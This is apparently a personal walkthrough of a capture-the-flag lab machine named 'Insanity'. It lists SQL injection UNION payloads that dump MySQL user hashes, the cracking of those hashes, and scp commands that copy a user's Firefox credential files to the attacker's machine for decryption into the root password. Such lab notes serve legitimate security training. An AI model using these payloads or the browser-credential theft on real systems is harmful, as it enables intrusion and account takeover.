@@ -1,0 +1,65 @@
+Insanity 
+
+Port 21 is rabbithole (dont waste time)
+dirb http://192.168.56.122
+visitin http://192.168.56.122/news 
+got username Otis
+
+visit another webpage
+http://192.168.56.122/monitoring/login.php
+got login
+otis:123456
+
+Checked another directory 
+http://192.168.56.122/webmail/src/login.php
+
+going back to http://192.168.56.122/monitoring/index.php?page=modify&name=test2
+and checked for sql injection 
+
+intercept using burpsuite 
+relplace field name to “ or 1=1#
+add new entry with test” UNION SELECT NULL, NULL, @@hostname, @@version; # ( invalid IP)
+test” UNION SELECT NULL, NULL, NULL, SCHEMA_NAME FROM information_schema.SCHEMATA; #
+
+test” UNION SELECT 1, user, password, authentication_string FROM mysql.user; #
+after bruteforcing I got password 
+visiting redirecting http://www.insanityhosting.vm
+make entry inside /etc/hosts
+http://www.insanityhosting.vm/news/admin/
+Maybe its vulnerable for sql injection 
+
+" UNION SELECT NULL,NULL,user(),database() -- -
+" UNION SELECT NULL, NULL, @@hostname, @@version -- -
+" UNION SELECT 1,2,3,4 -- -
+" UNION SELECT 1,2,SCHEMA_NAME,4 FROM INFORMATION_SCHEMA.SCHEMATA -- -
+
+https://mariadb.com/kb/en/the-mysql-database-tables/
+" UNION SELECT 1,User,Password,authentication_string FROM mysql.user -- -
+Got authentication hashes of 2 users
+1,root,*CDA244FF510B063DA17DFF84FF39BA0849F7920F,
+1,,,
+1,elliot,,*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
+
+crack hashses on https://crackstation.net/
+got password 
+elliot123
+ssh elliot@192.168.56.123
+
+found inmportant folder .mozilla
+i need 4 files cert9.db, cookies.sqlite, key4.db, logins.json
+ls .mozilla/firefox/esmhp32w.default-default | grep -E “logins.json|cert9.db|cookies.sqlite|key4.db”
+I found all 4 files
+Copy all file s
+mkdir cerd  
+cp -o StrictHostKeyChecking=no -r elliot@192.168.56.123:/home/elliot/.mozilla/firefox/esmhp32w.default-default/logins.json /home/vijay/insanity/firefox_decrypt/cerd
+scp -o StrictHostKeyChecking=no -r elliot@192.168.56.123:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cert9.db /home/vijay/insanity/firefox_decrypt/cerd
+scp -o StrictHostKeyChecking=no -r elliot@192.168.56.123:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cookies.sqlite /home/vijay/insanity/firefox_decrypt/cerd
+
+scp -o StrictHostKeyChecking=no -r elliot@192.168.56.123:/home/elliot/.mozilla/firefox/esmhp32w.default-default/key4.db /home/vijay/insanity/firefox_decrypt/cerd
+
+python firefox_decrypt.py cerd
+got root user password
+
+
+
+
